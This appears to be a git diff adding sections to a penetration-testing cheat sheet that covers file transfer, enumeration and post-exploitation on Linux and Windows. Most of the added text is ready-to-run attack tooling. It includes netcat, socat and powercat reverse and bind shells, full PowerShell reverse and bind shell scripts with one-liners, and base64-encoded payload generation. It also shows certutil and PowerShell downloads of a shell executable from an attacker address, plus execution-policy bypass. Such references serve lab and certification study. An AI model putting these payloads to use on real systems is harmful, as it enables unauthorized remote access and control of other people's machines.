@@ -11,10 +11,45 @@ Alternatively:
 apropos <KEYWORD>
 ```
 
+## Find stuff
+```bash
+sudo find / -name <SEARCHTERM>
+```
+
+## Environment variables
+basic environment variables you may need:
+```bash
+$PATH	#Search Paths
+$USER	#Username
+$PWD	#Current working directory
+$HOME	#Homedirectory
+```
+get all environment variables:
+```bash
+env
+```
+
+## Bash history
+saved to ~/.bash_history
+
+show bash history:
+```bash
+history
+```
+
+ 
+
 
 # External Enumeration
 
 ## OSINT
+
+### Whois
+Forward / Reverse Search with whois
+```bash
+whois <DOMAIN> / <IP>
+```
+
 ### Crawl words from website for passwordlist
 ```bash
 cewl <domain> -m 6 -w words.txt
@@ -111,15 +146,21 @@ wpscan --url <TARGET-URL>
 
 ## Windows
 ### Download files with certutil
-```bash
+```cmd
 certutil.exe -urlcache -f http://<ip>:<port>/<filename> <localfilename>
 ```
 Example:
-```bash
+```cmd
 certutil.exe -urlcache -f http://10.10.14.37:8080/shell.exe reverse_shell.exe
 ```
 
 ### Downlaod files with Powershell
+Oneliner:
+```cmd
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','<TARGET-FILENAME>')"
+```
+
+Powershell-Script:
 ```cmd
 echo $storageDir = $pwd > wget.ps1
 echo $webclient = New-Object System.Net.WebClient >>wget.ps1
@@ -128,7 +169,51 @@ echo $file = "new-exploit.exe" >>wget.ps1
 echo $webclient.DownloadFile($url, $file) >>wget.ps1
 ```
 
+### Powercat Filetransfer
+```powershell
+PS> powercat -c <IP> -p <PORT> -i <FILENAME>
+```
+
 Execute File with: [Execute Powershell File, bypass all policies](#execute-powershell-file-bypass-all-policies)
+
+## Linux
+### wget
+```bash
+wget -O <filename.xyz> http://<URL>/
+```
+
+### curl
+```bash
+curl -o <filename.xyz> http://<URL>/
+```
+
+### axel
+(very fast downloader (-n # gives number of connections))
+```bash
+axel -a -n 20 -o <filename.xyz> http://<URL>/
+```
+
+## nc / netcat
+File receiver:
+```
+nc -nlvp 4444 > <FILENAME>
+```
+File sender:
+```
+nc -nv <IP> <PORT> < <FILENAME>
+```
+
+## socat
+File sender:
+```bash
+socat TCP4-LISTEN:<PORT>,fork file:<FILENAME.xyz>
+```
+File receiver:
+```
+socat TCP4:<IP>:<PORT> file:<FILENAME>,create
+```
+
+
 
 ## Python Webserver
 Create webserver listening to port 8080 offering files from current working directory
@@ -171,6 +256,12 @@ Create a unique pattern to identify correct position for buffer overflow
 # Local Enumeration
 
 ## Local Linux Enumeration
+
+### Gather information about current user
+show username and groups of current user:
+```bash
+id
+```
 
 ### System information/version
 Show information about kernel and linux system
@@ -228,13 +319,102 @@ Dump full memory from service with Procdump
 
 
 # Post Exploitation
+
+## Netcat Fun
+
+Create netcat listener:
+```
+nc -nlvp <PORT>
+```
+
+Connect to port with netcat:
+```
+nc -nv <IP> <PORT>
+```
+
+### Filetransfer
+File receiver:
+```
+nc -nlvp 4444 > <FILENAME>
+```
+File sender:
+```
+nc -nv <IP> <PORT> < <FILENAME>
+```
+
+### Netcat Shell
+#### Bind Shell on Windows
+```cmd
+nc -nlvp 4444 -e cmd.exe
+```
+#### Bind Shell on Linux
+```bash
+nc -nlvp 4444 -e /bin/bash
+```
+#### Reverse Shell on Linux
+```bash
+nc -nv <IP> <PORT> -e /bin/bash
+```
+#### Reverse Shell on Windows
+```cmd
+nc -nv <IP> <PORT> -e cmd.exe
+```
+
+## Socat Fun
+Connect to port with socat:
+```bash
+socat - TCP4:<IP>:<PORT>
+```
+Create listener with socat:
+```bash
+socat TCP-LISTEN:<PORT> STDOUT
+```
+### File Transfer with socat
+File sender:
+```bash
+socat TCP4-LISTEN:<PORT>,fork file:<FILENAME.xyz>
+```
+File receiver:
+```
+socat TCP4:<IP>:<PORT> file:<FILENAME>,create
+```
+
+### Reverse Shell on Linux with socat
+Listener:
+```
+socat -d -d TCP4-LISTEN:<PORT> STDOUT
+```
+Shell:
+```
+socat TCP4:<IP>:<PORT> EXEC:/bin/bash
+```
+
+### encrypted bind shell with socat
+```bash
+# create (self signed) SSL certificate:
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+# combine key and cetificate to pem file
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+# create encrypted listener
+socat OPENSSL-LISTEN:<PORT>,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+```
+connect to encrypted bind shell:
+```
+socat - OPENSSL:<IP>:<PORT>,verify=0
+```
+
+
 ## Linux Post Exploitation
 ### Create tty console with python
 ```bash
 python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/zsh")'
 ```
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/sh")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/zsh")'
 ```
 
 ### Cracking encrypted zip-file
@@ -243,6 +423,104 @@ fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' <zip-file-name>
 ```
 
 ## Windows Post Exploitation
+
+### Powershell Fun
+```powershell
+Set-ExecutionPolicy Unrestricted
+Get-ExecutionPolicy
+```
+
+#### Powershell File Transfer
+```cmd
+powershell -c "(new-object System.Net.WebClient).DownloadFile('http://<IP>:<PORT>/<FILE>','<TARGET-FILENAME>')"
+```
+
+#### Powershell Shells
+##### Powershell Reverseshell
+```powershell
+$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>);
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+	$sendback = (iex $data 2>&1 | Out-String );
+	$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+	$stream.Write($sendbyte,0,$sendbyte.Length);
+	$stream.Flush();
+}
+
+$client.Close();
+```
+Same as Oneliner:
+```cmd
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>', <PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();}$client.Close();""
+```
+
+##### Powershell Bind Shell
+```powershell
+$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);
+$listener.start();
+$client = $listener.AcceptTcpClient();
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
+{
+	$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
+	$sendback = (iex $data 2>&1 | Out-String );
+	$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';
+	$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+	$stream.Write($sendbyte,0,$sendbyte.Length);
+	$stream.Flush()
+}
+
+$client.Close();
+$listener.Stop()
+```
+
+Same as Oneliner:
+```cmd
+powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',<PORT>);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '>';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}$client.Close();$listener.Stop()"
+```
+
+### Powercat
+```powershell
+# Load powercat script (only in current instance)
+PS> . .\powercat.ps1
+```
+#### Powercat Filetransfer
+```powershell
+PS> powercat -c <IP> -p <PORT> -i <FILENAME>
+```
+
+#### Powercat Reverse Shell
+```powershell
+PS> powercat -c <IP> -p <PORT> -e cmd.exe
+```
+
+#### Powercat Bind Shell
+```powershell
+PS> powercat -l -p <PORT> -e cmd.exe
+```
+
+#### Powercat Standalone Payloads
+Generate reverse shell payload with powercat:
+```
+# Payload generation:
+PS> powercat -c <IP> -p <PORT> -e cmd.exe -g > reverseshell.ps1
+# Execute on target PC:
+PS> .\reversehell.ps1
+```
+Generate (base64) encoded reverse shell payload with powercat:
+```
+PS> powercat -c <IP> -p <PORT> -e cmd.exe -ge > encodedreverseshell.ps1
+# Execute:
+PS> powershell.exe -E <INSERT HERE BASE64 CONTENT OF GENERATED FILE>
+```
+
+
+
 ### Execute Powershell file, bypass all policies
 ```cmd
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1
@@ -251,4 +529,40 @@ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File 
 ### RDP connection from Linux host to Windows target
 ```cmd
 rdesktop -u <User> -p <Password> <Target-IP>
+```
+
+# Stuff you also may need
+
+## Wireshark
+### Display Filters
+```
+tcp.port == <PORT>
+```
+
+## Tcpdump
+### read pcap file
+```bash
+tcpdump -r <FILENAME.pcap>
+```
+### skip DNS lookup:
+```bash
+tcpdump -n -r <FILENAME.pcap>
+```
+### find most common ips
+```bash
+tcpdump -n -r <FILENAME.pcap> | awk -F" " '{print $3}' | sort | uniq -c | head
+# gives Result:
+# <Number of Packets> <IP>
+```
+### destination host filter
+```bash
+tcpdump -n dst host <IP> -r <FILENAME.pcap>
+```
+### port filter
+```bash
+tcpdump -n port <PORT> -r <FILENAME.pcap>
+```
+### print packet data as Hex and ASCII
+```bash
+tcpdump -nX -r <FILENAME.pcap>
 ```
